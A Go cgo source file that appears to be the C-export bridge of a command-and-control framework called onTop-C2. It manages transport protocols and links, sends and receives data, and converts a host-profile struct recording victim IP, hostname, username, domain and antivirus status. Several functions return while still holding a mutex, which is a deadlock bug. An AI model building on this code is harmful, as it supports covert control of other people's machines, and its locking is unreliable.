package main

/*
#include <stdlib.h>
#include <string.h>
#define C_SMALL_STRING_LEN 32
#define C_MEDIUM_STRING_LEN 64
#define C_BIG_STRING_LEN 128

typedef struct {
	char		Name[C_MEDIUM_STRING_LEN];
	int			Cores;
	int			Threads;
	char		Arch[C_SMALL_STRING_LEN];
	int			Clock;
	int			Cache;

} cpu_data;

typedef struct {
	char		Name[C_BIG_STRING_LEN];
	int			Active;

} av_data;

typedef struct {
	char		Name[C_BIG_STRING_LEN];
	char		Version[C_BIG_STRING_LEN];
	char		Arch[C_SMALL_STRING_LEN];
	char		Hostname[C_BIG_STRING_LEN];
	char		Username[C_BIG_STRING_LEN];
	char		Domain[C_BIG_STRING_LEN];
	int			Uptime;
	av_data		AV;

} os_data;

typedef struct {
	char		ID[C_SMALL_STRING_LEN];
	char		IP[C_SMALL_STRING_LEN];
	cpu_data	CPU;
	os_data		OS;

} C_Scroll;
*/
import "C"

import (
	"encoding/json"
	"io"
	"net"
	"sync"
	"unsafe"

	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/rituals"
	"github.com/Yyax13/onTop-C2/src/types"
)

var (
	ritualsMap =		make(map[int]types.RitualInit)
	arcanesMap =		make(map[int]*types.ArcaneLink)
	arcanesIDCounter	int
	ritualsIDCounter	int
	ritualMutex			sync.Mutex
	arcaneMutex			sync.Mutex

)

//export CreateProtocol
func CreateProtocol(ritualName *C.char, ritualNameLen C.int, paramsJson *C.char, paramsJsonLen C.int, fideliusName *C.char, fideliusNameLen C.int) C.int {
	ritualMutex.Lock()
	defer ritualMutex.Unlock()

	ritualNameFromC := C.GoStringN(ritualName, ritualNameLen)
	paramsJsonFromC := C.GoStringN(paramsJson, paramsJsonLen)
	fideliusNameFromC := C.GoStringN(fideliusName, fideliusNameLen)

	params := make(map[string]string)
	if paramsJsonFromC != "" {
		if err := json.Unmarshal([]byte(paramsJsonFromC), &params); err != nil {
			return 0 // Invalid JSON parameters

		}

	}

	_, exists := fidelius.AvaliableFidelius[fideliusNameFromC]
	if !exists {
		return 0 // The specified fidelius do not exists

	}

	params["FIDELIUS"] = fideliusNameFromC
	creator, exists := rituals.AvaliableRitualCreators[ritualNameFromC]
	if !exists {
		return 0 // Not found the ritual
	
	}

	ritual, err := creator(params)
	if err != nil {
		return 0 // Failed to create the ritual with params

	}

	ritualsIDCounter++
	id := ritualsIDCounter
	ritualsMap[id] = ritual

	return C.int(id)

}

//export DestroyProtocol
func DestroyProtocol(id C.int) {
	ritualMutex.Lock()
	defer ritualMutex.Unlock()

	if _, exists := ritualsMap[int(id)]; exists {
		delete(ritualsMap, int(id))
		return

	}
	// else: Attempt to delete a non-existent ritual

}

//export InitArcane
func InitArcane(ritualID C.int) C.int {
	arcaneMutex.Lock()
	defer arcaneMutex.Unlock()
	ritual, exists := ritualsMap[int(ritualID)]
	if !exists {
		return 0

	}

	arcane, err := ritual.InitArcane()
	if err != nil {
		return 0 // Failed to init the arcane from ritual with ID

	}

	arcanesIDCounter++
	id := arcanesIDCounter
	arcanesMap[id] = arcane

	return C.int(id)

}

//export Send
func Send(arcaneID C.int, data *C.char, dataLen C.int) C.int {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		return C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()

	dataFromC := C.GoBytes(unsafe.Pointer(data), dataLen)
	err := arcane.Send(dataFromC)
	if err != nil {
		return C.int(0) // Some error occurred during data sending

	}

	return C.int(1)
	
}

//export Receive
func Receive(arcaneID C.int, output **C.char, outputLen *C.int) C.int {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		arcaneMutex.Unlock()
		*output = nil
		*outputLen = C.int(0)
		return C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()

	data, err := arcane.Receive()
	if err != nil {
		*output = nil
		*outputLen = C.int(0)
		switch err {
		case io.EOF:
			return C.int(2) // Conn closed

		default:
			return C.int(0) // Smt failed

		}
		
	}

	if len(data) == 0 {
		*output = nil
		*outputLen = C.int(0)
		return C.int(1)

	}

	cData := C.malloc(C.size_t(len(data)))
	if cData == nil {
		*output = nil
		*outputLen = C.int(0)
		return C.int(3) // malloc failed

	}

	C.memcpy(cData, unsafe.Pointer(&data[0]), C.size_t(len(data)))
	*output = (*C.char)(cData)
	*outputLen = C.int(len(data))

	return C.int(1)

}

//export Close
func Close(arcaneID C.int) C.int {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		return C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()
	err := arcane.Close()
	if err != nil {
		return C.int(0) // Smt failed

	}

	return C.int(1) // Success

}

//export IsActive
func IsActive(arcaneID C.int) C.int {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		return C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()
	isActive := arcane.IsActive()
	if isActive {
		return C.int(1)

	}

	return C.int(0)

}

func GoScrollToCScroll(goScroll *types.Scroll) *C.C_Scroll {
	cScroll := (*C.C_Scroll)(C.malloc(C.sizeof_C_Scroll))
	if cScroll == nil {
		return nil

	}

	cID := C.CString(goScroll.ID)
	cIP := C.CString(goScroll.IP.String())
	C.strncpy(&cScroll.ID[0], cID, C.C_SMALL_STRING_LEN - 1)
	C.strncpy(&cScroll.IP[0], cIP, C.C_SMALL_STRING_LEN)
	cScroll.IP[C.C_SMALL_STRING_LEN -1] = 0
	cScroll.ID[C.C_SMALL_STRING_LEN - 1] = 0
	C.free(unsafe.Pointer(cID))
	C.free(unsafe.Pointer(cIP))

	cCPUName := C.CString(goScroll.CPU.Name)
	cCPUArch := C.CString(goScroll.CPU.Arch)
	C.strncpy(&cScroll.CPU.Name[0], cCPUName, C.C_MEDIUM_STRING_LEN - 1)
	C.strncpy(&cScroll.CPU.Arch[0], cCPUArch, C.C_SMALL_STRING_LEN - 1)
	cScroll.CPU.Arch[C.C_SMALL_STRING_LEN - 1] = 0
	cScroll.CPU.Name[C.C_MEDIUM_STRING_LEN - 1] = 0
	cScroll.CPU.Cores = C.int(goScroll.CPU.Cores)
	cScroll.CPU.Threads = C.int(goScroll.CPU.Threads)
	cScroll.CPU.Clock = C.int(goScroll.CPU.Clock)
	cScroll.CPU.Cache = C.int(goScroll.CPU.Cache)
	C.free(unsafe.Pointer(cCPUName))
	C.free(unsafe.Pointer(cCPUArch))

	cOSName := C.CString(goScroll.OS.Name)
	cOSVersion := C.CString(goScroll.OS.Version)
	cOSArch := C.CString(goScroll.OS.Arch)
	cOSHostname := C.CString(goScroll.OS.Hostname)
	cOSUsername := C.CString(goScroll.OS.Username)
	cOSDomain := C.CString(goScroll.OS.Domain)
	cOSAVName := C.CString(goScroll.OS.AV.Name)
	C.strncpy(&cScroll.OS.Name[0], cOSName, C.C_BIG_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.Version[0], cOSVersion, C.C_BIG_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.Arch[0], cOSArch, C.C_SMALL_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.Hostname[0], cOSHostname, C.C_BIG_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.Username[0], cOSUsername, C.C_BIG_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.Domain[0], cOSDomain, C.C_BIG_STRING_LEN - 1)
	C.strncpy(&cScroll.OS.AV.Name[0], cOSAVName, C.C_BIG_STRING_LEN - 1)
	cScroll.OS.Name[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.Version[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.Arch[C.C_SMALL_STRING_LEN - 1] = 0
	cScroll.OS.Hostname[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.Username[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.Domain[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.Uptime = C.int(goScroll.OS.Uptime)
	cScroll.OS.AV.Name[C.C_BIG_STRING_LEN - 1] = 0
	cScroll.OS.AV.Active = func() C.int {
		if goScroll.OS.AV.Active {
			return C.int(1)

		}

		return C.int(0)

	}()

	C.free(unsafe.Pointer(cOSName))
	C.free(unsafe.Pointer(cOSVersion))
	C.free(unsafe.Pointer(cOSArch))
	C.free(unsafe.Pointer(cOSHostname))
	C.free(unsafe.Pointer(cOSUsername))
	C.free(unsafe.Pointer(cOSDomain))
	C.free(unsafe.Pointer(cOSAVName))

	return cScroll

}

func CScrollToGoScroll(cScroll *C.C_Scroll) *types.Scroll {
	if cScroll == nil {
		return nil

	}

	goScroll := &types.Scroll{}

	goScroll.ID = C.GoString(&cScroll.ID[0])
	goScroll.IP = net.ParseIP(C.GoString(&cScroll.IP[0]))

	goScroll.CPU.Name = C.GoString(&cScroll.CPU.Name[0])
	goScroll.CPU.Cores = int(cScroll.CPU.Cores)
	goScroll.CPU.Threads = int(cScroll.CPU.Threads)
	goScroll.CPU.Arch = C.GoString(&cScroll.CPU.Arch[0])
	goScroll.CPU.Clock = int(cScroll.CPU.Clock)
	goScroll.CPU.Cache = int(cScroll.CPU.Cache)

	goScroll.OS.Name = C.GoString(&cScroll.OS.Name[0])
	goScroll.OS.Version = C.GoString(&cScroll.OS.Version[0])
	goScroll.OS.Arch = C.GoString(&cScroll.OS.Arch[0])
	goScroll.OS.Hostname = C.GoString(&cScroll.OS.Hostname[0])
	goScroll.OS.Username = C.GoString(&cScroll.OS.Username[0])
	goScroll.OS.Domain = C.GoString(&cScroll.OS.Domain[0])
	goScroll.OS.Uptime = int(cScroll.OS.Uptime)
	goScroll.OS.AV.Name = C.GoString(&cScroll.OS.AV.Name[0])
	goScroll.OS.AV.Active = cScroll.OS.AV.Active != 0

	return goScroll

}

//export GetScroll
func GetScroll(arcaneID C.int) (*C.C_Scroll, C.int) {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		return &C.C_Scroll{}, C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()

	scroll := arcane.GetScroll()
	cScroll := GoScrollToCScroll(&scroll)

	return cScroll, C.int(1)

}

//export SetScroll
func SetScroll(arcaneID C.int, cScroll *C.C_Scroll) C.int {
	arcaneMutex.Lock()
	arcane, exists := arcanesMap[int(arcaneID)]
	if !exists {
		return C.int(0) // Attempt to access an non-existent arcaneLink

	}

	arcaneMutex.Unlock()
	goCScroll := CScrollToGoScroll(cScroll)
	err := arcane.SetScroll(goCScroll)
	if err != nil {
		return C.int(0)

	}

	return C.int(1)
	
}

//export FreeGoMem
func FreeGoMem(pointer *C.char) C.int {
	if pointer == nil {
		return 0 // Attempt to free a null pointer

	}

	C.free(unsafe.Pointer(pointer))
	return 1

}

func main() {}
